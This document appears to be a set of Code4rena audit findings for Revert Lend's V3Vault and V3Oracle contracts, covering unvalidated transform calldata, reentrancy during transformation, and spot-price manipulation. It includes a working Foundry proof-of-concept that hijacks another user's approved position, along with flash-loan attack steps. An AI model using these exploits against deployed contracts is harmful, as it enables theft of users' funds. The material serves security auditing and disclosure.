# [H-1][UNIQUE] V3Vault::transform does not validate the data input and allows a depositor to exploit any position approved on the transformer 

## Submission Link
https://github.com/code-423n4/2024-03-revert-lend-findings/issues/214

# Lines of code
https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497

## Impact
Any account holding a position inside `V3Vault` can transform any NFT position outside the vault that has been delegated to Revert operators for transformation(`AutoRange`, `AutoCompound` and all other transformers that manage positions outside of the vault).

The exploiter can pass any `params` at any time, affecting positions they do not own and their funds critically.

## Vulnerability details
In order to borrow from `V3Vault` an account must first create a collaterized position by sending his position NFT through the [`create()` function](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L400C14-L400C20)

Any account that has a position inside the vault can use the `transform()` function to manage the NFT, while it is owned by the vault:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497

```
  function transform(uint256 tokenId, address transformer, bytes calldata data)
        external
        override
        returns (uint256 newTokenId)
    {
        ....
        //@audit -> tokenId inside data not checked

        (uint256 newDebtExchangeRateX96,) = _updateGlobalInterest();

        address loanOwner = tokenOwner[tokenId];

        // only the owner of the loan, the vault itself or any approved caller can call this
        if (loanOwner != msg.sender && !transformApprovals[loanOwner][tokenId][msg.sender]) {
            revert Unauthorized();
        }

        // give access to transformer
        nonfungiblePositionManager.approve(transformer, tokenId);

        (bool success,) = transformer.call(data);
        if (!success) {
            revert TransformFailed();
        }

        ....

        // check owner not changed (NEEDED because token could have been moved somewhere else in the meantime)
        address owner = nonfungiblePositionManager.ownerOf(tokenId);
        if (owner != address(this)) {
            revert Unauthorized();
        }

        ....

        return tokenId;
    }
```

The user passes an approved transformer address and the calldata to execute on it. The problem here is that the function only validates the ownership of the `uint256 tokenId` input parameter, however it never checks if the `tokenId` encoded inside `bytes calldata data` parameter belongs to `msg.sender`.

This allows any vault position holder to **call an allowed transformer with arbitrary params encoded as calldata and change any position delegated to that transformer**.

This will impact all current and future transformers that manage Vault positions.

To prove the exploit I'm providing a coded POC using the [`AutoCompound` tranformer](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/transformers/AutoCompound.sol#L16).

## Proof of Concept
A short explanation of the POC:

* `Alice` is an account outside the vault that approves her position `ALICE_NFT` to be auto-compounded by Revert controlled operators(bots)
* `Bob` decides to act maliciously and transform `Alice` position
* `Bob` opens a position in the vault with his `BOB_NFT` so that he can call `transform()`
* `Bob` calls `V3Vault.transform()` with `BOB_NFT` as `tokenId` param to pass validation but encodes `ALICE_NFT` inside data
* `Bob` successfully transforms `Alice` position with his params

You can add the following test to `V3Vault.t.sol` and run `forge test --contracts /test/V3Vault.t.sol --mt testTransformExploit -vvvv`

```solidity
function testTransformExploit() external {
        // Alice
        address ALICE_ACCOUNT = TEST_NFT_ACCOUNT;
        uint256 ALICE_NFT = TEST_NFT;

        // Malicious user
        address EXPLOITER_ACCOUNT = TEST_NFT_ACCOUNT_2;
        uint256 EXPLOITER_NFT = TEST_NFT_2;

        // Set up an auto-compound transformer
        AutoCompound autoCompound = new AutoCompound(
            NPM,
            WHALE_ACCOUNT,
            WHALE_ACCOUNT,
            60,
            100
        );
        vault.setTransformer(address(autoCompound), true);
        autoCompound.setVault(address(vault), true);

        // Set fee to 2%
        uint256 Q64 = 2 ** 64;
        autoCompound.setReward(uint64(Q64 / 50));

        // Alice decides to delegate her position to
        // Revert bots (outside of vault) to be auto-compounded
        vm.prank(ALICE_ACCOUNT);
        NPM.approve(address(autoCompound), ALICE_NFT);

        // Exploiter opens a position in the Vault
        vm.startPrank(EXPLOITER_ACCOUNT);
        NPM.approve(address(vault), EXPLOITER_NFT);
        vault.create(EXPLOITER_NFT, EXPLOITER_ACCOUNT);
        vm.stopPrank();

        // Exploiter passes ALICE_NFT as param
        AutoCompound.ExecuteParams memory params = AutoCompound.ExecuteParams(
            ALICE_NFT,
            false,
            0
        );

        // Exploiter account uses his own token to pass validation
        // but transforms Alice position
        vm.prank(EXPLOITER_ACCOUNT);
        vault.transform(
            EXPLOITER_NFT,
            address(autoCompound),
            abi.encodeWithSelector(AutoCompound.execute.selector, params)
        );
    }
```

Since the exploiter can control the calldata send to the transformer, he can impact any approved position in various ways. In the case of `AutoCompound` it can be:

* draining the position funds - AutoCompound collects a fee on every transformation. The exploiter can call it multiple times
* manipulating `swap0To1` & `amountIn` parameters to execute swaps in unfavourable market conditions, leading to loss of funds or value extraction

Those are only a couple of ideas. The impact can be quite severe depending on the transformer and parameters passed.

## Tools Used
Manual Review, Foundry

## Recommended Mitigation Steps
Consider adding a check inside `transform()` to make sure the provided `tokenId` and the one encoded as calldata are the same. This way the caller will not be able to manipulate other accounts positions.

## Assessed type
Invalid Validation


# [H-2] During transformation the caller can re-enter the Vault through the onERC721Received function

## Submission Link
https://github.com/code-423n4/2024-03-revert-lend-findings/issues/309

# Lines of code
- https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497 
- https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L450-L472


## Impact
Calling `V3Vault.transform()` with some transformers (`AutoRange.sol`) opens a re-entrancy opportunity when the old position is replaced and returned to its owner inside `V3Vault.onERC721Received()`. If the owner is a contract it can change the `tokenId` or distort debt calculations by changing `debtExchangeRateX96` or change the state in a way not expected inside `transform()`

## Proof of Concept
When calling `V3Vault.transform()` this is what happens:

```
function transform(
        uint256 tokenId,
        address transformer,
        bytes calldata data
    ) external override returns (uint256 newTokenId) {
        
        // Get debtEchangeRate
        (uint256 newDebtExchangeRateX96, ) = _updateGlobalInterest();
       
        .....

     
        //@audit-ok - Can re-enter from AutoRange.sol 
        (bool success, ) = transformer.call(data);  //  <--------- call Transformer
        if (!success) {
            revert TransformFailed();
        }

        .....

        // Check that debt is healthy based on debtEchangeRate

        uint256 debt = _convertToAssets(
            loans[tokenId].debtShares,
            newDebtExchangeRateX96,  // <------ No longer accurate, after re-entrancy
            Math.Rounding.Up
        );
        _requireLoanIsHealthy(tokenId, debt);

        transformedTokenId = 0;

        return tokenId;
    }
```

The 3 important steps here are:

* `debtExchangeRateX96` is updated and cached, to be used for calculating debt value after the transformation and confirm it is healthy
* transformer is called
* finally the debt is re-calculated after the transformation to make sure it remains healthy

Some transformers (like `AutoRange.sol`) move current `tokenId` assets to a new position with a new `tokenId`. The new token is send back to `V3Vault`, where the `onERC721Received()` function handles replacing the old tokeId with the new and sending the old token to its owner:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L450-L472

The problem here is that the old NFT is transferred in the same transaction ([through `_cleanupLoan()`](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1083))

If the recipient is a contract, this will call it's own `onERC721Received()` method which can be used to re-enter `V3Vault`.

Some possible actions the malicious contract can take are:

* call `create()` to open a position with some arbitrary `tokenId`. This would transfer the NFT to `V3Vault` and call again `onERC721Received()`. Since the vault will be in a transformation mode (the exploiter re-entered before transformation is over) the position will be moved to the token he just deposited, instead off the one provided by the transformer
* another thing he can do upon re-entering the vault is to change the debtExchangeRate (by `borrowing`, `repaying` etc.) and manipulate debt health [check in the end of `transform()`, which uses a cached value of the debt rate](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497)

## Tools Used
Manual Review

## Recommended Mitigation Steps
Consider adding a separate function, that the owner must call to receive his old NFT instead of transferring it during the `transform()` transaction

## Assessed type
Reentrancy


# [M-1][Selected] V3Oracle susceptible to price manipulation

## Submission Link
https://github.com/code-423n4/2024-03-revert-lend-findings/issues/175


# Lines of code
https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L120

# Vulnerability details
## Impact
`V3Oracle::getValue()` is used to calculate the value of a position. The value is the product of the `oracle price * the amounts held in the position`. Price manipulation is prevented by checking for differences between Chainlink oracle and Uniswap TWAP.

However the amounts (`amount0`,`amount1`) of the tokens in the position are calculated based on the current pool price (`pool.spot0()`), which means they can be manipulated. And since the value of the total position is calculated from `amount0`,`amount1` it can be manipulated as well.

## Proof of Concept
Invoking `V3Oracle::getValue()` first calls the `getPositionBreakdown()` to calculate the `amount0` and `amount1` of the tokens in the position based on spot price:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L102

```
 (address token0, address token1, uint24 fee,, uint256 amount0, uint256 amount1, uint256 fees0, uint256 fees1) =
            getPositionBreakdown(tokenId);
```

Under the hood this calls `_initializeState()` which get's the current price in the pool: https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L395

```
(state.sqrtPriceX96, state.tick,,,,,) = state.pool.slot0();
```

Based on this value the `amount0` & `amount1` (returned from `getPositionBreakdown()` are deduced:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L426

```
function _getAmounts(PositionState memory state)
        internal
        view
        returns (uint256 amount0, uint256 amount1, uint128 fees0, uint128 fees1)
    {
        if (state.liquidity > 0) {
       ....
            (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
                state.sqrtPriceX96, state.sqrtPriceX96Lower, state.sqrtPriceX96Upper, state.liquidity
            );
        }
       ....
    }
```

After that the prices are fetched from Uniswap & Chainlink and compared.

```
 (price0X96, cachedChainlinkReferencePriceX96) =
            _getReferenceTokenPriceX96(token0, cachedChainlinkReferencePriceX96);
 (price1X96, cachedChainlinkReferencePriceX96) =
            _getReferenceTokenPriceX96(token1, cachedChainlinkReferencePriceX96);
```

Finally the value of the positions tokens and fees are calculated in the following formula:

```
value = (price0X96 * (amount0 + fees0) / Q96 + price1X96 * (amount1 + fees1) / Q96) * Q96 / priceTokenX96;
feeValue = (price0X96 * fees0 / Q96 + price1X96 * fees1 / Q96) * Q96 / priceTokenX96;
price0X96 = price0X96 * Q96 / priceTokenX96;
price1X96 = price1X96 * Q96 / priceTokenX96;
```

Basically the position value is a product of 2 parameters `price0X96/price1X96 ` & `amount0/amount1`:

* `price0X96/price1X96` - those are the prices derived from the oracles - they are validated and cannot be manipulated
* `amount0/amount1` - those are calculated based on the spot price and can be manipulated

Since `amount0` & `amount1` can be increased/decreased if a malicious user decides to distort the pool price in the current block (through a flash loan for example), this will directly impact the calculated value, even though the price itself cannot be manipulated since it is protected against manipulation

The check in the end `_checkPoolPrice()` only verifies that the price from the oracles is in the the acceptable ranges. This however does not safeguard the value calculation, which as explained above also includes the `amounts` parameters.

It should be noted that `_checkPoolPrice` uses the uniswap TWAP price for comparison, which is the price over an extended period of time making it very hard to manipulate in a single block. And exactly this property of the TWAP price can allow an attacker to manipulate the spot price significantly, without affecting the TWAP much, which means the price difference won't change much and `_checkPoolPrice` will pass.

A short example:

* The `V3Oracle` has been configured to use a TWAP duration of 1 hour
* The TWAP price reported for the last hour is 4000 USDC for 1 WETH
* Bob takes a flash loan to distort the spot price heavily and call in the same transaction `borrow` | `repay` on a V3Vault (which call `V3Oracle.getValue()`)
* Because of the price manipulation `amount1` & `amoun0` are heavily inflated/deflated
* However this changes the TWAP value only a little (if at all), so the price validation passes
* The position value is calculated by multiplying the stable oracle price by the heavily manipulated amounts
* User repay/borrows at favorable conditions

## Tools Used
Manual Review

## Recommended Mitigation Steps
Consider calculating `amount0` & `amount1` based on the oracle price and not on the spot price taken from `slot0()`. This way the above exploit will be mitigated

## Assessed type
Uniswap